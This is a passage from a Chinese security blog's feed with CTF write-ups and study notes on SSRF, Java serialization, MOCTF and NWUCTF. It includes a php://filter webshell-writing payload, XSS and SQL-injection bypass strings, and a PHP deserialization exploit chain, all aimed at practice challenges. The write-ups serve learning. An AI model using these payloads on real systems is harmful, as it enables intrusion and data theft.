Forgery：服务器端请求伪造）是一种以攻击者构造形成，由服务器端发起请求的一个安全漏洞。一般情况下，SSRF漏洞攻击的对象是从外网无法访问的内部系统，正因为它是由服务器端发起的，所以它能够请求到与它相连而与外网隔离的内部系统。</p><p>SSRF形成的原因大都是由于服务端提供了从其他服务器获取数据的功能，且没有对目标地址做过滤和限制，比如从指定url地址获取网页文本内容，加载指定地址的图片，下载等。我们外网通过web服务器去访问内网的数据库，web服务器帮我们去获取数据，相当于一个跳板，然后返回数据给我们。<br>比如加载指定地址的图片，web服务器访问内部的图片服务器，有可能会把所有的图片都泄露。</p><h2 id="SSRF常见危害"><a href="#SSRF常见危害" class="headerlink" title="SSRF常见危害"></a>SSRF常见危害</h2><ul><li>可以对外网，服务器所在内网，本地进行端口扫描，获取一些服务的Banner信息等</li><li>攻击运行在内网或本地的应用程序，如内网的OA,ERP系统等外网拿不到的，但是通过SSRF攻击可以攻击到这些系统</li><li>对内网web应用程序进行指纹识别，通过访问默认文件实现（如Readme文件）</li><li>攻击内外网web应用，主要是使用GET就可以实现的攻击（比如Struts2,SQLI等）</li><li>利用File协议读取本地文件等<h2 id="SSRF常见应用场景"><a href="#SSRF常见应用场景" class="headerlink" title="SSRF常见应用场景"></a>SSRF常见应用场景</h2></li><li>分享</li></ul><p>一些分享应用中，web应用在分享功能中，通常会获取目标url地址网页内容中的<code>&lt;title&gt;&lt;/title&gt;</code> 标签的文本内容作为显示来提供更好的体验，如果在此功能中没有对目标地址范围做过滤与限制就存在SSRF漏洞。如360的页面有一些其他网站的超链接。</p><ul><li>在线翻译</li></ul><p>通过url地址翻译对应文本的内容<br>提供此功能的国内公司有百度、有道等</p><ul><li>图片加载与下载</li></ul><p>图片加载远程图片地址此功能用到的地方很多，但大多比较隐秘，比如在有些公司中，加载自家图片服务器上的图片用于展示，开发者通常对图片做些微小调整例如加水印、压缩等，很大可能造成SSRF漏洞。</p><ul><li>图片、文章收藏功能</li><li>未公开的API实现以及其他调用URL的功能</li></ul><h2 id="如何防范？"><a href="#如何防范？" class="headerlink" title="如何防范？"></a>如何防范？</h2><p>对网站的ip地址进行严格的过滤，需要严格限定可以访问的地址，或者过滤掉内网IP地址，或者规定只能请求哪些URL，其他的一律不能请求，白名单。</p><p>以上来自360网络安全学院授课内容，侵权删</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记一下CSRF和SSRF的笔记~~&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>Java中的序列化和反序列化</title>
    <link href="http://yoursite.com/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>http://yoursite.com/2020/02/03/Java%E4%B8%AD%E7%9A%84%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T08:04:28.292Z</updated>
    
    <content type="html"><![CDATA[<h1 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h1><p>众所周知，类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，该怎么做？这就可以通过序列化将数据转换为字节流。<br><strong>对象序列化</strong>是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为<strong>反序列化</strong>。而创建的字节流是与平台无关的，在一个平台上序列化的对象可以在不同的平台上反序列化。<br>简言之，序列化就是在运行代码的时候，我们想保存多个对象的数据，就把内存里面的这些对象给变成一连串的字节。常见的就是变成文件，其实不序列化也可以保存文件，emmm</p><a id="more"></a><h2 id="什么时候需要序列化？"><a href="#什么时候需要序列化？" class="headerlink" title="什么时候需要序列化？"></a>什么时候需要序列化？</h2><p>当你想把的内存中的对象状态保存到一个文件中或者数据库中时候；<br>当你想用套接字在网络上传送对象的时候；<br>当你想通过RMI传输对象的时候；</p><h2 id="如何使Java类可序列化？"><a href="#如何使Java类可序列化？" class="headerlink" title="如何使Java类可序列化？"></a>如何使Java类可序列化？</h2><p>通过实现java.io.Serializable接口，可以在Java类中启用可序列化。它是一个标记接口，意味着它不包含任何方法或字段，仅用于标识可序列化的语义。</p><h2 id="试图序列化不可序列化的对象怎么办？"><a href="#试图序列化不可序列化的对象怎么办？" class="headerlink" title="试图序列化不可序列化的对象怎么办？"></a>试图序列化不可序列化的对象怎么办？</h2><p>将得到一个 RuntimeException 异常：主线程中出现异常 java.io.NotSerializableException。</p><h2 id="什么是serialVersionUID？"><a href="#什么是serialVersionUID？" class="headerlink" title="什么是serialVersionUID？"></a>什么是serialVersionUID？</h2><p>SerialVersionUID是一个标识符，当它通常使用对象的哈希码序列化时会标记在对象上。我们可以通过Java中serialver工具找到该对象的serialVersionUID。<br>语法：<strong>serialver classname</strong>，SerialVersionUID用于对象的版本控制。当您添加或修改类中的任何字段时，已经序列化的类将无法恢复，因为serialVersionUID已为新类生成与旧的序列化对象将不同。Java序列化过程依赖于正确的serialVersionUID恢复序列化对象的状态，并在serialVersionUID不匹配时抛出java.io.InvalidClassException 异常。</p><h2 id="Transient-关键字"><a href="#Transient-关键字" class="headerlink" title="Transient 关键字"></a>Transient 关键字</h2><p>transient修饰符仅适用于变量，不适用于方法和类。在序列化时，如果我们不想序列化特定变量以满足安全约束，那么我们应该将该变量声明为transient。执行序列化时，JVM会忽略transient变量的原始值并将默认值保存到文件中。因此，transient意味着不要序列化。</p><h2 id="Transient-与-Static"><a href="#Transient-与-Static" class="headerlink" title="Transient 与 Static"></a>Transient 与 Static</h2><p>静态变量不是对象状态的一部分，因此它不参与序列化。所以将静态变量声明为transient变量是没有用处的。</p><h2 id="Final-与-Transient"><a href="#Final-与-Transient" class="headerlink" title="Final 与 Transient"></a>Final 与 Transient</h2><p>final变量将直接通过值参与序列化，所以将final变量声明为transient变量不会产生任何影响。现在，让我们考虑一个显示Java中的序列化和反序列化的程序。<br><img src="https://img-blog.csdnimg.cn/20190927150923104.png" alt="在这里插入图片描述"><br>实现 Serializable 接口的 Employee 类：<br><img src="https://img-blog.csdnimg.cn/2019092715100119.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190927151014405.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下面的 SerializingObject 程序实例化一个 Employee 的对象，并将它序列化到文件中。<br><img src="https://img-blog.csdnimg.cn/20190927151041821.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>下面的 DeSerializingObject 程序反序列化 Employee 对象。<br><img src="https://img-blog.csdnimg.cn/20190927151117717.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>文章借鉴了好几个大佬的，下面附上原链接：<br><a href="https://baijiahao.baidu.com/s?id=1622011683975285944&wfr=spider&for=pc" target="_blank" rel="noopener">Java程序员：Java中的序列化和反序列化</a><br><a href="https://blog.csdn.net/u013870094/article/details/82765907" target="_blank" rel="noopener">Java 之 Serializable 序列化和反序列化的概念,作用的通俗易懂的解释</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;引言&quot;&gt;&lt;a href=&quot;#引言&quot; class=&quot;headerlink&quot; title=&quot;引言&quot;&gt;&lt;/a&gt;引言&lt;/h1&gt;&lt;p&gt;众所周知，类的对象会随着程序的终止而被垃圾收集器销毁。如果要在不重新创建对象的情况下调用该类，该怎么做？这就可以通过序列化将数据转换为字节流。&lt;br&gt;&lt;strong&gt;对象序列化&lt;/strong&gt;是一个用于将对象状态转换为字节流的过程，可以将其保存到磁盘文件中或通过网络发送到任何其他程序；从字节流创建对象的相反的过程称为&lt;strong&gt;反序列化&lt;/strong&gt;。而创建的字节流是与平台无关的，在一个平台上序列化的对象可以在不同的平台上反序列化。&lt;br&gt;简言之，序列化就是在运行代码的时候，我们想保存多个对象的数据，就把内存里面的这些对象给变成一连串的字节。常见的就是变成文件，其实不序列化也可以保存文件，emmm&lt;/p&gt;
    
    </summary>
    
    
      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
    
    
  </entry>
  
  <entry>
    <title>MOCTF misc</title>
    <link href="http://yoursite.com/2020/02/03/MOCTF%20misc/"/>
    <id>http://yoursite.com/2020/02/03/MOCTF%20misc/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T09:11:27.298Z</updated>
    
    <content type="html"><![CDATA[<p>MOCTF刷题ing</p><a id="more"></a><h1 id="0x00-假装安全"><a href="#0x00-假装安全" class="headerlink" title="0x00 假装安全"></a>0x00 假装安全</h1><p>题目给了一个carefully.jpg，用记事本打开发现有flag.txt，于是binwalk一下，<br><img src="https://img-blog.csdnimg.cn/20190816164148407.png" alt="在这里插入图片描述"><br>果然，里面有个zip，其中有个flag.txt，binwalk -e carefully.jpg解压一下，得到一个压缩包和flag.txt，打开flag.txt就可以看到一串像是flag的东西：</p><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">mcfCrflyS1eot</span>&#123;<span class="variable">@eul_ld</span>&#125;</span><br></pre></td></tr></table></figure><p>栅栏密码解密，即可得到moctf{C@refully_Sl1de}</p><h1 id="0x01-扫扫出奇迹"><a href="#0x01-扫扫出奇迹" class="headerlink" title="0x01 扫扫出奇迹"></a>0x01 扫扫出奇迹</h1><p>拿到二维码，试着扫一扫，扫不出来，发现是一个取反色的二维码，<br><img src="https://img-blog.csdnimg.cn/20190816165240568.png" alt="在这里插入图片描述"><br>用stegsolve的Xor可以取反色，得到二维码，<br><img src="https://img-blog.csdnimg.cn/20190816165306213.png" alt="在这里插入图片描述"><br>扫一扫得到flag：moctf{qr_code_1s_1n_1t}</p><h1 id="0x02-光阴似箭"><a href="#0x02-光阴似箭" class="headerlink" title="0x02 光阴似箭"></a>0x02 光阴似箭</h1><p>是一个gif动图，用stegsolve的Frame Browser查看，<br><img src="https://img-blog.csdnimg.cn/20190816165531562.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>反过来就是moctf{Flash_Movie}</p><h1 id="0x03-杰斯的魔法"><a href="#0x03-杰斯的魔法" class="headerlink" title="0x03 杰斯的魔法"></a>0x03 杰斯的魔法</h1><p>查看源代码，感觉有点像包含flag，试一试，moctf{scr1pt_1s_magical}真的是！</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(unescape('%3Cscript%20language%20%3D%20%22javascript%22%3Ealert%28%22moctf%7Bscr1pt_1s_magical%7D%22%29%3B%3C/script%3E'));</span><br></pre></td></tr></table></figure><p>当然在线url解码也可以！<br><img src="https://img-blog.csdnimg.cn/20190816170203192.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x04-流量分析"><a href="#0x04-流量分析" class="headerlink" title="0x04 流量分析"></a>0x04 流量分析</h1><p>是一个pcapng文件，用wireshark打开，利用分析中的追踪流量进行分析发现flag<br><img src="https://img-blog.csdnimg.cn/20190816173300375.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">即可得到moctf{c@N_y0U_4lnd_m8}。</p><h1 id="0x05-女神的告白"><a href="#0x05-女神的告白" class="headerlink" title="0x05 女神的告白"></a>0x05 女神的告白</h1><p>解压需要密码，提示说压缩包密码是以meimei开头，利用ARCHPR直接掩码攻击，设置好掩码，后面的位数可以一位一位的试，试到第四位时得到密码。将得到的密码解压文件，获取flag：moctf{Y0u_@re_A_g00d_man}<br>（ARCHPR 4.54破解版可以帮助你破解密码，它可以恢复保护口令或将用所有流行的档案版本创建的加密 ZIP 和 RAR 档案解除锁定。）<br><img src="https://img-blog.csdnimg.cn/20190816182614968.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;MOCTF刷题ing&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>MOCTF 死亡退出</title>
    <link href="http://yoursite.com/2020/02/03/Moctf%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BAWrite%20up/"/>
    <id>http://yoursite.com/2020/02/03/Moctf%E6%AD%BB%E4%BA%A1%E9%80%80%E5%87%BAWrite%20up/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T09:12:22.249Z</updated>
    
    <content type="html"><![CDATA[<p>MOCTF刷题 死亡退出</p><a id="more"></a><p><img src="https://img-blog.csdnimg.cn/20190716184119973.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>一开始就看到了源码，萌新表示大致看得懂什么意思，大致分析下：<br>第四行@$ c.=$ _POST[‘c’];    //@为屏蔽错误不显示在浏览器界面，$ _POST[‘c’]是以post的方式获取字符串类型的变量c,”.=”表示变量c会与之前变量中的<?php exit;?>进行字符串连接。很显然题目需要我们以post的方式提交变量c使<?php exit;?>失效。<br>@$filename = $_POST[‘file’];同理我们以post方式提交一个字符串的变量file，赋值给filename。<br>后面if判断，如果我们没有以post提交filename，就会运行空的tmp.php，否则就会把c的内容写入filename文件中并运行。<br>后来百度了一下，好像涉及php的filter协议，看了一下大佬的博客(<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html)，似懂非懂，" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html)，似懂非懂，</a><br><img src="https://img-blog.csdnimg.cn/20190716184811333.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p>原理：<br>通过上传字符串变量c，通过<?php exit;?>与变量c连接破坏掉语句结构；同时变量c也需要写入到变量filename这个文件中通过执行获得flag。<br>在包含HTML、PHP语言的的网页中，通常会在进行解析XML将PHP的<??>语法当作为XML，而导致解析错误。为了防止这样的错误产生，php引入了php://filter协议流，通过该协议流可以将php的代码经过base64再编码一遍来避免此类冲突的产生。<br>可以巧妙运用base64解码的过程，将需要执行的php代码使用base64上传，再利用php:filter协议流进行base64解码执行。<br>base64解码过程会将&lt;、?、;、空格、&gt;等7个不合法字符忽略。从而导致<?php exit?>经过base64解码后变为phpexit。<br>base64算法解码是4个byte为一组，”phpexit”只有7个字符，这样会导致我们base64加密过后的密码，第一个字符被当作无效字符，从而破坏掉代码结构。</p><p>实现：<br>1.编写我们希望在文件中执行的php代码，猜测flag放在flag.php文件中，构建代码让系统执行获取flag文件命令</p><pre><code>&lt;?php system(&apos;cat flag.php&apos;);?&gt;</code></pre><p>2.最后的文件需要通过base64解密执行，所以需要对代码进行base64加密。<br><?php system('cat flag.php');?>加密后代码为：PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKSA7Pz4=<br>3.写入的字符串是与<?php exit;?>连接后写入的，但是经过base64解密后phpexit只有7个字符我们需要随便加一个字符补充完整性（这里我选择的字符是a），防止在解密时候破坏我们加密的webshell。故变量c为aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKSA7Pz4=<br>4.f9打开hackbar,以post方式提交c=aPD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKSA7Pz4=&amp;file=php://filter/write=convert.base64-decode/resource=tmp.php<br>f12查看即可得flag<br><img src="https://img-blog.csdnimg.cn/20190716191616722.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>emmm，萌新第一次写wp,借鉴了很多别人的，若有大佬看到错误，望指正<del>~</del>继续学习，加油！</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;MOCTF刷题 死亡退出&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF WP" scheme="http://yoursite.com/categories/CTF-WP/"/>
    
    
  </entry>
  
  <entry>
    <title>NWUCTF web</title>
    <link href="http://yoursite.com/2020/02/03/NWU-CTF%20web/"/>
    <id>http://yoursite.com/2020/02/03/NWU-CTF%20web/</id>
    <published>2020-02-02T16:00:00.000Z</published>
    <updated>2020-02-03T08:05:41.844Z</updated>
    
    <content type="html"><![CDATA[<p>NWUCTF刷题记录</p><a id="more"></a><h1 id="0x00-机器人"><a href="#0x00-机器人" class="headerlink" title="0x00 机器人"></a>0x00 机器人</h1><p>知道robots.txt文件的话，就很容易做出来了，robots.txt文件可以见<a href="https://blog.csdn.net/ITmincherry/article/details/88881423" target="_blank" rel="noopener">我之前的博客</a></p><h1 id="0x01-让我们来弹一个flag"><a href="#0x01-让我们来弹一个flag" class="headerlink" title="0x01 让我们来弹一个flag"></a>0x01 让我们来弹一个flag</h1><p>题目给了<a href="https://blog.csdn.net/u011781521/article/details/53894399" target="_blank" rel="noopener">学习资料</a>，然后根据它的提示，输入<code>&lt;script&gt;alert(&#39;flag&#39;)&lt;/script&gt;</code>，即可得到nwuctf{XSS_Is_A_Important_Vul}</p><h1 id="0x02-php弱类型"><a href="#0x02-php弱类型" class="headerlink" title="0x02 php弱类型"></a>0x02 php弱类型</h1><p>查看源码，</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//try again</span></span><br><span class="line">&lt;/?php</span><br><span class="line">$s = $_GET[<span class="string">'s'</span>];</span><br><span class="line">$a = <span class="string">'QNKCDZO'</span>;</span><br><span class="line">$md5a = md5($a);</span><br><span class="line">$md5s = md5($s);</span><br><span class="line"><span class="keyword">if</span>($s != $a &amp;&amp; $md5a == $md5s)&#123;</span><br><span class="line">    <span class="keyword">echo</span> $flag;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'try again'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要求明文不相等md5值相等，百度了一下，有很多?，<br>240610708、QNKCDZO、aabg7XSs、aabC9RqS，这几个随便传入哪一个都行，得到flag。<br>具体关于php弱类型的内容可以见<a href="https://blog.csdn.net/ITmincherry/article/details/96966702" target="_blank" rel="noopener">我博客</a></p><h1 id="0x03-An-easy-SQLi-2-万能密码"><a href="#0x03-An-easy-SQLi-2-万能密码" class="headerlink" title="0x03 An easy SQLi 2(万能密码"></a>0x03 An easy SQLi 2(万能密码</h1><p>1’ or 1=1#/*，密码随便，不输都行<br><img src="https://img-blog.csdnimg.cn/2019091522473471.png" alt="在这里插入图片描述"></p><h1 id="0x04-头啊头哇"><a href="#0x04-头啊头哇" class="headerlink" title="0x04 头啊头哇"></a>0x04 头啊头哇</h1><p><img src="https://img-blog.csdnimg.cn/20190915230211867.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20190915230244558.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>改what为flag看看，<br><img src="https://img-blog.csdnimg.cn/20190915230425227.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用burp抓包，改User-Agent，<br><img src="https://img-blog.csdnimg.cn/20190915230745337.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述">上图说你从google来吗，很明显加个referer头再go一下</p><p><img src="https://img-blog.csdnimg.cn/20190915230919876.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x05-唯快不破"><a href="#0x05-唯快不破" class="headerlink" title="0x05 唯快不破?"></a>0x05 唯快不破?</h1><p>套路：用截图工具在它猝不及防的时候一个个接下来。。。<br><img src="https://img-blog.csdnimg.cn/20190915232307720.png" alt="在这里插入图片描述"><br>python:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url1=<span class="string">'http://123.207.166.65/nwuctf/weibu/zxcvbnh.html'</span></span><br><span class="line">print(requests.get(url1).text)</span><br></pre></td></tr></table></figure><p>运行后得到第一段的flag，并且返回了跳转的第二段的地址，加上第二段的URL，继续跑，同理得出第三段，拼起来提交。<br><img src="https://img-blog.csdnimg.cn/20190915232625718.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0lUbWluY2hlcnJ5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h1 id="0x06-php反序列化"><a href="#0x06-php反序列化" class="headerlink" title="0x06 php反序列化"></a>0x06 php反序列化</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="string">"concat string"</span>.<span class="keyword">$this</span>-&gt;mod1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">str</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1-&gt;flag();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"1"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get_flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"tql, 缁欏笀鍌呴€抐lag:"</span>.<span class="string">"nwuctf&#123;xxxxxxxxxxxxxxx&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = $_GET[<span class="string">'string'</span>];</span><br><span class="line">unserialize($a);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>借鉴一位大佬的<a href="https://www.cryscat.com/2019/03/10/%E8%A5%BF%E5%8C%97%E5%A4%A7%E5%AD%A6moeCTF-Web/" target="_blank" rel="noopener">博客</a>，payload代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">hack</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">str</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> get_flag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">get_flag</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">flag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"tql, 缁欏笀鍌呴€抐lag:"</span>.<span class="string">"nwuctf&#123;xxxxxxxxxxxxxxx&#125;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$a = <span class="keyword">new</span> hack;</span><br><span class="line">$b = serialize($a);</span><br><span class="line"><span class="keyword">echo</span> $b;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行代码后得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"hack"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"mod1"</span>;O:<span class="number">3</span>:<span class="string">"str"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"str1"</span>;O:<span class="number">8</span>:<span class="string">"get_flag"</span>:<span 